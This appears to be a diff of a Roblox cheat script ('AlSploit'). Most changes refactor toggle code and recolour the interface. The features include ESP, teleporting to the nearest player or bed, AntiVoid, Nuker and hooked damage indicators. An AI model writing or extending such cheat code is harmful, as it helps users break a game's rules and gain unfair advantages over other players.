 					end
 
-					if Settings.Esp.Value == false then
-						task.spawn(function()
+					task.spawn(function()
+						if Settings.Esp.Value == false then
 							for i, v in next, PlayerService:GetPlayers() do
 								if IsAlive(v) and v.Character.PrimaryPart:FindFirstChild("Esp") then
 									v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
 								end
 							end
-						end)
 
-						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
-					end
+							UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
+						end
+					end)
 				end
 			end
 		end)
@@ -5334,7 +5424,7 @@ task.spawn(function()
 					Settings.CustomInventory.Value = not Settings.CustomInventory.Value
 
 					if Settings.CustomInventory.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.CustomInventory.Value == false then
@@ -5469,7 +5559,7 @@ task.spawn(function()
 					Settings.CustomHealthBar.Value = not Settings.CustomHealthBar.Value
 
 					if Settings.CustomHealthBar.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.CustomHealthBar.Value == false then
@@ -5487,11 +5577,12 @@ task.spawn(function()
 
 		task.spawn(function()
 			if Settings.NoNameTag.Value == true then
-				if IsAlive(LocalPlayer) and LocalPlayer.Character.Head:FindFirstChild("Nametag") then
-
-					if ReplicatedStorage:FindFirstChild("Nametag") and LocalPlayer.Character.Head:FindFirstChild("Nametag") then
-						ReplicatedStorage:FindFirstChild("Nametag"):Destroy()
-					end
+				if IsAlive(LocalPlayer) and LocalPlayer.Character.Head:FindFirstChild("Nametag") then					
+					task.spawn(function()
+						if ReplicatedStorage:FindFirstChild("Nametag") and LocalPlayer.Character.Head:FindFirstChild("Nametag") then
+							ReplicatedStorage.Nametag:Destroy()
+						end
+					end)
 
 					LocalPlayer.Character.Head.Nametag.Parent = ReplicatedStorage
 
@@ -5501,7 +5592,7 @@ task.spawn(function()
 
 							if LocalPlayer.Character.Head:FindFirstChild("Nametag") then
 								if ReplicatedStorage:FindFirstChild("Nametag") and LocalPlayer.Character.Head:FindFirstChild("Nametag") then
-									ReplicatedStorage:FindFirstChild("Nametag"):Destroy()
+									ReplicatedStorage.Nametag:Destroy()
 								end
 
 								LocalPlayer.Character.Head.Nametag.Parent = ReplicatedStorage								
@@ -5510,7 +5601,9 @@ task.spawn(function()
 					end)
 				end
 			end
+		end)			
 
+		task.spawn(function()
 			if Settings.NoNameTag.Value == false then
 				local NameTag = ReplicatedStorage:FindFirstChild("Nametag")
 
@@ -5547,7 +5640,7 @@ task.spawn(function()
 					Settings.NoNameTag.Value = not Settings.NoNameTag.Value
 
 					if Settings.NoNameTag.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.NoNameTag.Value == false then
@@ -5560,216 +5653,129 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "GalaxySky", Settings.GalaxySky.Value, function(CallBack)
-		Settings.GalaxySky.Value = CallBack
-
-		if Settings.GalaxySky.Value == true then
-			if LightingService:FindFirstChild("Sky") and Settings.GalaxySky.Value == true then
-				LightingService.Sky.Parent = ReplicatedStorage
-
-				local Sky = Instance.new("Sky")
-				local ID = 8281961896
-
-				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
-				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
-				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
-				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
-				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
-				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID
-
-				Sky.Parent = LightingService
-				Sky.Name = "GalaxySky"
-			end
-		end
-
-		if LightingService:FindFirstChild("WinterSky") and Settings.GalaxySky.Value == true then
-			LightingService.WinterSky:Destroy()
-
-			local Sky = Instance.new("Sky")
-
-			local ID = 8281961896
-
-			Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
-			Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
-			Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
-			Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
-			Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
-			Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID
-
-			Sky.Parent = LightingService
-			Sky.Name = "GalaxySky"
-		end
-
-		if Settings.GalaxySky.Value == false then
-			if ReplicatedStorage:FindFirstChild("Sky") and LightingService:FindFirstChild("GalaxySky") and Settings.GalaxySky.Value == false then
-				LightingService.GalaxySky:Destroy()
-
-				ReplicatedStorage.Sky.Parent = LightingService 
-			end
-		end
-	end)
-
-	task.spawn(function()
-		local InstanceUI
-		local Value = false
-
-		DropDownButton.Activated:Connect(function()
-			Value = not Value
-
-			if Value == true then
-				InstanceUI = CreateKeyBind(WorldTab, Settings.GalaxySky.KeyBind, LayoutOrder + 1, function(CallBack)
-					Settings.GalaxySky.KeyBind = CallBack
-				end)
-			end
-
-			if Value == false then
-				InstanceUI:Destroy()
-			end
-		end)
-	end)
-
-	task.spawn(function()
-		UserInputService.InputBegan:Connect(function(Input)
-			if not UserInputService:GetFocusedTextBox() then
-				if Input.KeyCode.Name == Settings.GalaxySky.KeyBind then
-					Settings.GalaxySky.Value = not Settings.GalaxySky.Value
-
-					if Settings.GalaxySky.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
-					end
-
-					if Settings.GalaxySky.Value == false then
-						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
-					end
-				end
-			end
-		end)
-	end)
-end)
-
-task.spawn(function()
 	local WinterSky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "WinterSky", Settings.WinterSky.Value, function(CallBack)
 		Settings.WinterSky.Value = CallBack
 
-		if Settings.WinterSky.Value == true then
-			if LightingService:FindFirstChild("Sky") and Settings.WinterSky.Value == true then
-				LightingService.Sky.Parent = ReplicatedStorage
-
-				local Sky = Instance.new("Sky")
-
-				Sky.StarCount = 5000
-				Sky.SkyboxUp = "rbxassetid://8139676647"
-				Sky.SkyboxLf = "rbxassetid://8139676988"
-				Sky.SkyboxFt = "rbxassetid://8139677111"
-				Sky.SkyboxBk = "rbxassetid://8139677359"
-				Sky.SkyboxDn = "rbxassetid://8139677253"
-				Sky.SkyboxRt = "rbxassetid://8139676842"
-				Sky.SunTextureId = "rbxassetid://6196665106"
-				Sky.SunAngularSize = 11
-				Sky.MoonTextureId = "rbxassetid://8139665943"
-				Sky.MoonAngularSize = 30
-
-				Sky.Parent = LightingService			
-				Sky.Name = "WinterSky"
-			end
-
-			if LightingService:FindFirstChild("GalaxySky") and Settings.WinterSky.Value == true then
-				LightingService.GalaxySky:Destroy()
-
-				local Sky = Instance.new("Sky")
-
-				Sky.StarCount = 5000
-				Sky.SkyboxUp = "rbxassetid://8139676647"
-				Sky.SkyboxLf = "rbxassetid://8139676988"
-				Sky.SkyboxFt = "rbxassetid://8139677111"
-				Sky.SkyboxBk = "rbxassetid://8139677359"
-				Sky.SkyboxDn = "rbxassetid://8139677253"
-				Sky.SkyboxRt = "rbxassetid://8139676842"
-				Sky.SunTextureId = "rbxassetid://6196665106"
-				Sky.SunAngularSize = 11
-				Sky.MoonTextureId = "rbxassetid://8139665943"
-				Sky.MoonAngularSize = 30
-
-				Sky.Parent = LightingService
-				Sky.Name = "WinterSky"
+		task.spawn(function()
+			if Settings.WinterSky.Value == true then
+				task.spawn(function()
+					if LightingService:FindFirstChild("Sky") then
+						LightingService.Sky.Parent = ReplicatedStorage					
+					end
+				end)			
 
 				task.spawn(function()
-					if LightingService:FindFirstChildOfClass("SunRaysEffect") then
-						LightingService:FindFirstChildOfClass("SunRaysEffect"):Destroy()
+					task.spawn(function()
+						local Sky = Instance.new("Sky")
 
-						local SunRay = Instance.new("SunRaysEffect")
+						Sky.StarCount = 5000
+						Sky.SkyboxUp = "rbxassetid://8139676647"
+						Sky.SkyboxLf = "rbxassetid://8139676988"
+						Sky.SkyboxFt = "rbxassetid://8139677111"
+						Sky.SkyboxBk = "rbxassetid://8139677359"
+						Sky.SkyboxDn = "rbxassetid://8139677253"
+						Sky.SkyboxRt = "rbxassetid://8139676842"
+						Sky.SunTextureId = "rbxassetid://6196665106"
+						Sky.SunAngularSize = 11
+						Sky.MoonTextureId = "rbxassetid://8139665943"
+						Sky.MoonAngularSize = 30
 
-						SunRay.Intensity = 0.03
-						SunRay.Parent = LightingService
-					end
+						Sky.Parent = LightingService
+						Sky.Name = "WinterSky"
+					end)
 
-					if not LightingService:FindFirstChildOfClass("SunRaysEffect") then
-						local SunRay = Instance.new("SunRaysEffect")
+					task.spawn(function()
+						if LightingService:FindFirstChildOfClass("SunRaysEffect") then
+							LightingService:FindFirstChildOfClass("SunRaysEffect"):Destroy()
 
-						SunRay.Intensity = 0.03
-						SunRay.Parent = LightingService
-					end
+							local SunRay = Instance.new("SunRaysEffect")
+
+							SunRay.Intensity = 0.03
+							SunRay.Parent = LightingService
+						end
+					end)
+
+					task.spawn(function()
+						if not LightingService:FindFirstChildOfClass("SunRaysEffect") then
+							local SunRay = Instance.new("SunRaysEffect")
+
+							SunRay.Intensity = 0.03
+							SunRay.Parent = LightingService
+						end
+					end)
+
+					task.spawn(function()
+						if LightingService:FindFirstChildOfClass("BloomEffect") then
+							LightingService:FindFirstChildOfClass("BloomEffect"):Destroy()
+
+							local Bloom = Instance.new("BloomEffect")
+
+							Bloom.Threshold = 2
+							Bloom.Intensity = 1
+							Bloom.Size = 2
+							Bloom.Parent = LightingService
+						end
+					end)
+
+					task.spawn(function()
+						if not LightingService:FindFirstChildOfClass("BloomEffect") then
+							local Bloom = Instance.new("BloomEffect")
+
+							Bloom.Threshold = 2
+							Bloom.Intensity = 1
+							Bloom.Size = 2
+							Bloom.Parent = LightingService
+						end
+					end)
+
+					task.spawn(function()
+						if LightingService:FindFirstChildOfClass("Atmosphere") then
+							LightingService:FindFirstChildOfClass("Atmosphere"):Destroy()
+
+							local Atmosphere = Instance.new("Atmosphere")
+
+							Atmosphere.Density = 0.3
+							Atmosphere.Offset = 0.25
+							Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
+							Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
+							Atmosphere.Glare = 0
+							Atmosphere.Haze = 0
+							Atmosphere.Parent = LightingService
+						end
+					end)
+
+					task.spawn(function()
+						if not LightingService:FindFirstChildOfClass("Atmosphere") then
+							local Atmosphere = Instance.new("Atmosphere")
+
+							Atmosphere.Density = 0.3
+							Atmosphere.Offset = 0.25
+							Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
+							Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
+							Atmosphere.Glare = 0
+							Atmosphere.Haze = 0
+							Atmosphere.Parent = LightingService
+						end
+					end)	
 				end)
 
 				task.spawn(function()
-					if LightingService:FindFirstChildOfClass("BloomEffect") then
-						LightingService:FindFirstChildOfClass("BloomEffect"):Destroy()
-
-						local Bloom = Instance.new("BloomEffect")
-
-						Bloom.Threshold = 2
-						Bloom.Intensity = 1
-						Bloom.Size = 2
-						Bloom.Parent = LightingService
-					end
-
-					if not LightingService:FindFirstChildOfClass("BloomEffect") then
-						local Bloom = Instance.new("BloomEffect")
-
-						Bloom.Threshold = 2
-						Bloom.Intensity = 1
-						Bloom.Size = 2
-						Bloom.Parent = LightingService
-					end
-				end)
-
-				task.spawn(function()
-					if LightingService:FindFirstChildOfClass("Atmosphere") then
-						LightingService:FindFirstChildOfClass("Atmosphere"):Destroy()
-
-						local Atmosphere = Instance.new("Atmosphere")
-
-						Atmosphere.Density = 0.3
-						Atmosphere.Offset = 0.25
-						Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
-						Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
-						Atmosphere.Glare = 0
-						Atmosphere.Haze = 0
-						Atmosphere.Parent = LightingService
-					end
-
-					if not LightingService:FindFirstChildOfClass("Atmosphere") then
-						local Atmosphere = Instance.new("Atmosphere")
-
-						Atmosphere.Density = 0.3
-						Atmosphere.Offset = 0.25
-						Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
-						Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
-						Atmosphere.Glare = 0
-						Atmosphere.Haze = 0
-						Atmosphere.Parent = LightingService
+					if LightingService:FindFirstChild("GalaxySky")then
+						LightingService:FindFirstChild("GalaxySky"):Destroy()					
 					end
 				end)
 			end
-		end
+		end)
 
-		if Settings.WinterSky.Value == false then
-			if ReplicatedStorage:FindFirstChild("Sky") and LightingService:FindFirstChild("WinterSky") and Settings.WinterSky.Value == false then
-				LightingService.WinterSky:Destroy()
+		task.spawn(function()
+			if Settings.WinterSky.Value == false then
+				if ReplicatedStorage:FindFirstChild("Sky") and LightingService:FindFirstChild("WinterSky") then
+					ReplicatedStorage:FindFirstChild("Sky").Parent = LightingService 		
 
-				ReplicatedStorage.Sky.Parent = LightingService 
+					LightingService:FindFirstChild("WinterSky"):Destroy()	
+				end
 			end
-		end
+		end)
 	end)
 
 	task.spawn(function()
@@ -5798,10 +5804,103 @@ task.spawn(function()
 					Settings.WinterSky.Value = not Settings.WinterSky.Value
 
 					if Settings.WinterSky.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.WinterSky.Value == false then
+						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
+					end
+				end
+			end
+		end)
+	end)
+end)
+
+task.spawn(function()
+	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "GalaxySky", Settings.GalaxySky.Value, function(CallBack)
+		Settings.GalaxySky.Value = CallBack
+
+		task.spawn(function()
+			if Settings.GalaxySky.Value == true then
+				if LightingService:FindFirstChild("Sky") then
+					LightingService.Sky.Parent = ReplicatedStorage
+
+					local Sky = Instance.new("Sky")
+					local ID = 8281961896
+
+					Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
+					Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
+					Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
+					Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
+					Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
+					Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID
+
+					Sky.Parent = LightingService
+					Sky.Name = "GalaxySky"
+				end
+			end
+		end)
+
+		task.spawn(function()
+			if Settings.GalaxySky.Value == true and LightingService:FindFirstChild("WinterSky") then
+				LightingService.WinterSky:Destroy()
+
+				local Sky = Instance.new("Sky")
+				local ID = 8281961896
+
+				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
+				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
+				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
+				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
+				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
+				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID
+
+				Sky.Parent = LightingService
+				Sky.Name = "GalaxySky"
+			end
+		end)	
+
+		task.spawn(function()
+			if Settings.GalaxySky.Value == false then
+				if ReplicatedStorage:FindFirstChild("Sky") and LightingService:FindFirstChild("GalaxySky") then
+					ReplicatedStorage.Sky.Parent = LightingService 
+
+					LightingService.GalaxySky:Destroy()				
+				end
+			end
+		end)		
+	end)
+
+	task.spawn(function()
+		local InstanceUI
+		local Value = false
+
+		DropDownButton.Activated:Connect(function()
+			Value = not Value
+
+			if Value == true then
+				InstanceUI = CreateKeyBind(WorldTab, Settings.GalaxySky.KeyBind, LayoutOrder + 1, function(CallBack)
+					Settings.GalaxySky.KeyBind = CallBack
+				end)
+			end
+
+			if Value == false then
+				InstanceUI:Destroy()
+			end
+		end)
+	end)
+
+	task.spawn(function()
+		UserInputService.InputBegan:Connect(function(Input)
+			if not UserInputService:GetFocusedTextBox() then
+				if Input.KeyCode.Name == Settings.GalaxySky.KeyBind then
+					Settings.GalaxySky.Value = not Settings.GalaxySky.Value
+
+					if Settings.GalaxySky.Value == true then
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
+					end
+
+					if Settings.GalaxySky.Value == false then
 						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
 					end
 				end
@@ -5815,45 +5914,48 @@ task.spawn(function()
 		Settings.Indicators.Value = CallBack
 
 		task.spawn(function()
-			local OldObj = debug.getupvalue(DamageIndicator, 10)
+			local OldObject = debug.getupvalue(DamageIndicator, 10)
 
-			if Settings.Indicators.Value == true then
-				local Messages = {"GodSploit", "Best Client", ":D", "💀"}
+			task.spawn(function()
+				if Settings.Indicators.Value == true then
+					local Messages = {"AlSploit", "Best Client", ":D", "💀"}
 
-				debug.setupvalue(DamageIndicator, 10, {
-					Create = function(self, obj, ...)
-						task.spawn(function()
-							if Settings.Indicators.Value == true then
-								local Message = Messages[math.random(#Messages)]
+					debug.setupvalue(DamageIndicator, 10, {
+						Create = function(self, Object, ...)
+							local Message = Messages[math.random(#Messages)]
 
-								obj.Parent.Text = Message
-								obj.Parent.TextColor3 = Color3.fromHSV(tick() % 10 / 10, 2, 2)
+							Object.Parent.Text = Message
+							Object.Parent.TextColor3 = Color3.fromHSV(tick() % 10 / 10, 2, 2)
 
-								task.spawn(function()
-									task.wait(0.75)
+							task.spawn(function()
+								task.wait(0.75)
 
-									if Settings.Indicators.Value == true then
-										obj.Parent:Destroy()
-									end
-								end)
-							end
-						end)
-					end
-				})
-			end
+								if Settings.Indicators.Value == true then
+									Object.Parent:Destroy()
+								end
+							end)
+						end
+					})
+				end
+			end)
 
-			if Settings.Indicators.Value == false then
-				debug.setupvalue(DamageIndicator, 10, {
-					Create = function(self, obj, ...)
-						obj = OldObj
+			task.spawn(function()
+				if Settings.Indicators.Value == false then
+					debug.setupvalue(DamageIndicator, 10, {
+						Create = function(self, Object, ...)
+							Object = OldObject
 
-						task.spawn(function()
-							task.wait(0.5)
-							obj.Parent:Destroy()
-						end)
-					end
-				})
-			end
+							task.spawn(function()
+								task.wait(0.5)
+
+								if Settings.Indicators.Value == false then
+									Object.Parent:Destroy()
+								end								
+							end)
+						end
+					})
+				end
+			end)			
 		end)
 	end)
 
@@ -5883,7 +5985,7 @@ task.spawn(function()
 					Settings.Indicators.Value = not Settings.Indicators.Value
 
 					if Settings.Indicators.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Indicators.Value == false then
@@ -5899,59 +6001,19 @@ task.spawn(function()
 	local AntiVoid, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "AntiVoid", Settings.AntiVoid.Value, function(CallBack)
 		Settings.AntiVoid.Value = CallBack
 
-		if Settings.AntiVoid.Value == true then
-			task.spawn(function()
-				repeat task.wait() until GetMatchState() ~= 0
-
-				local OldLowestPosition = math.huge
-				local LowestPosition = 99999
-
-				local BlockRaycastParameters = RaycastParams.new()
-
-				BlockRaycastParameters.FilterType = Enum.RaycastFilterType.Include
-				BlockRaycastParameters.FilterDescendantsInstances = CollectionService:GetTagged("block")
-
-				AntiVoidPart = Instance.new("Part")
-				AntiVoidPart.Parent = WorkSpace
-				AntiVoidPart.Material = Enum.Material.Neon
-				AntiVoidPart.Name = "AntiVoidPart"
-				AntiVoidPart.Size = Vector3.new(99999, 1, 99999)
-				AntiVoidPart.Position = Vector3.new(0, 99999, 0)
-				AntiVoidPart.Transparency = Settings.AntiVoid.Transparency
-				AntiVoidPart.Color = Color3.new(0.666667, 0, 1)
-				AntiVoidPart.CanCollide = false
-				AntiVoidPart.Anchored = true
-
-				for i, v in next, CollectionService:GetTagged("block") do
-					local NewRay = WorkSpace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), BlockRaycastParameters)
-
-					if NewRay then
-						LowestPosition = NewRay.Position.Y
-						if LowestPosition < OldLowestPosition then
-							OldLowestPosition = LowestPosition
-
-							AntiVoidPart.Position = Vector3.new(0, LowestPosition - 4, 0)
-						end
-					end					
-				end
-
-				AntiVoidPart.Touched:Connect(function()
-					if IsAlive(LocalPlayer) and AntiVoidPart and LocalPlayer.Character.PrimaryPart.Position.Y <= WorkSpace.AntiVoidPart.Position.Y then
-						for i = 1, 3 do
-							if IsAlive(LocalPlayer) then
-								LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, 100, LocalPlayer.Character.PrimaryPart.Velocity.Z)
-							end
-						end
-					end
-				end)
-			end)
-		end
-
-		if Settings.AntiVoid.Value == false then
-			if AntiVoidPart then
-				AntiVoidPart:Destroy()
+		task.spawn(function()
+			if Settings.AntiVoid.Value == true then
+				CreateAntiVoidPart()
 			end
-		end
+		end)
+
+		task.spawn(function()
+			if Settings.AntiVoid.Value == false then
+				if AntiVoidPart then
+					AntiVoidPart:Destroy()
+				end
+			end
+		end)	
 	end)
 
 	task.spawn(function()
@@ -5980,7 +6042,7 @@ task.spawn(function()
 					Settings.AntiVoid.Value = not Settings.AntiVoid.Value
 
 					if Settings.AntiVoid.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.AntiVoid.Value == false then
@@ -6028,32 +6090,36 @@ task.spawn(function()
 
 					local NearestPlayer = FindNearestPlayer()
 
-					if NearestPlayer ~= nil then
-						KillHumanoid()
+					task.spawn(function()
+						if NearestPlayer then
+							KillHumanoid()
 
+							LocalPlayer.CharacterAdded:Connect(function()
+								repeat task.wait() until IsAlive(LocalPlayer) and GetMatchState() ~= 0
+
+								if IsAlive(LocalPlayer) and Settings.PlayerTp.Value == true and FindNearestPlayer() then
+									task.wait(0.15)
+
+									TweenToNearestPlayer()
+								end
+							end)
+						end	
+					end)					
+				end
+
+				task.spawn(function()
+					if not IsAlive(LocalPlayer) then
 						LocalPlayer.CharacterAdded:Connect(function()
-							repeat task.wait() until IsAlive(LocalPlayer)
+							repeat task.wait() until IsAlive(LocalPlayer) and GetMatchState() ~= 0					
 
-							if IsAlive(LocalPlayer) and Settings.PlayerTp.Value == true then
-								task.wait(0.15)
+							if IsAlive(LocalPlayer) and Settings.PlayerTp.Value == true and FindNearestPlayer() then
+								task.wait(0.25)
 
 								TweenToNearestPlayer()
 							end
 						end)
-					end	
-				end
-
-				if not IsAlive(LocalPlayer) then
-					LocalPlayer.CharacterAdded:Connect(function()
-						repeat task.wait() until IsAlive(LocalPlayer)						
-
-						if IsAlive(LocalPlayer) and Settings.PlayerTp.Value == true and FindNearestPlayer() then
-							task.wait(0.25)
-
-							TweenToNearestPlayer()
-						end
-					end)
-				end
+					end
+				end)				
 			end	
 		end)
 	end)
@@ -6084,7 +6150,7 @@ task.spawn(function()
 					Settings.PlayerTp.Value = not Settings.PlayerTp.Value
 
 					if Settings.PlayerTp.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.PlayerTp.Value == false then
@@ -6107,32 +6173,36 @@ task.spawn(function()
 
 					local NearestPlayer = FindNearestPlayer()
 
-					if NearestPlayer ~= nil then
-						KillHumanoid()
+					task.spawn(function()
+						if NearestPlayer then
+							KillHumanoid()
 
+							LocalPlayer.CharacterAdded:Connect(function()
+								repeat task.wait() until IsAlive(LocalPlayer)
+
+								if IsAlive(LocalPlayer) and Settings.BedTp.Value == true and FindNearestPlayer() then
+									task.wait(0.15)
+
+									TweenToNearestBed()
+								end
+							end)
+						end	
+					end)					
+				end
+
+				task.spawn(function()
+					if not IsAlive(LocalPlayer) then
 						LocalPlayer.CharacterAdded:Connect(function()
-							repeat task.wait() until IsAlive(LocalPlayer)
+							repeat task.wait() until IsAlive(LocalPlayer)						
 
-							if IsAlive(LocalPlayer) and Settings.BedTp.Value == true then
-								task.wait(0.15)
+							if IsAlive(LocalPlayer) and Settings.BedTp.Value == true and FindNearestPlayer() then
+								task.wait(0.25)
 
 								TweenToNearestBed()
 							end
 						end)
-					end	
-				end
-
-				if not IsAlive(LocalPlayer) then
-					LocalPlayer.CharacterAdded:Connect(function()
-						repeat task.wait() until IsAlive(LocalPlayer)						
-
-						if IsAlive(LocalPlayer) and Settings.BedTp.Value == true and FindNearestPlayer() then
-							task.wait(0.25)
-
-							TweenToNearestBed()
-						end
-					end)
-				end
+					end
+				end)				
 			end	
 		end)
 	end)
@@ -6163,7 +6233,7 @@ task.spawn(function()
 					Settings.BedTp.Value = not Settings.BedTp.Value
 
 					if Settings.BedTp.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.BedTp.Value == false then
@@ -6206,7 +6276,7 @@ task.spawn(function()
 					Settings.Nuker.Value = not Settings.Nuker.Value
 
 					if Settings.Nuker.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 					end
 
 					if Settings.Nuker.Value == false then
@@ -6279,31 +6349,31 @@ task.spawn(function()
 	local Cape, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Cape", Settings.Cape.Value, function(CallBack)
 		Settings.Cape.Value = CallBack
 
-		if Settings.Cape.Value == true then
-			task.spawn(function()
+		task.spawn(function()
+			if Settings.Cape.Value == true then
 				local DecalId = (Settings.Cape.Sigma and 13528140280 or 16331277884)
 
 				CreateCape("rbxassetid://" .. DecalId)
 
 				task.spawn(function()
 					LocalPlayer.CharacterAdded:Connect(function()
-						if IsAlive(LocalPlayer) and not LocalPlayer.Character:FindFirstChild("Cape") and CallBack == true then
-							repeat task.wait() until IsAlive(LocalPlayer)
-
-							CreateCape("rbxassetid://" .. DecalId)
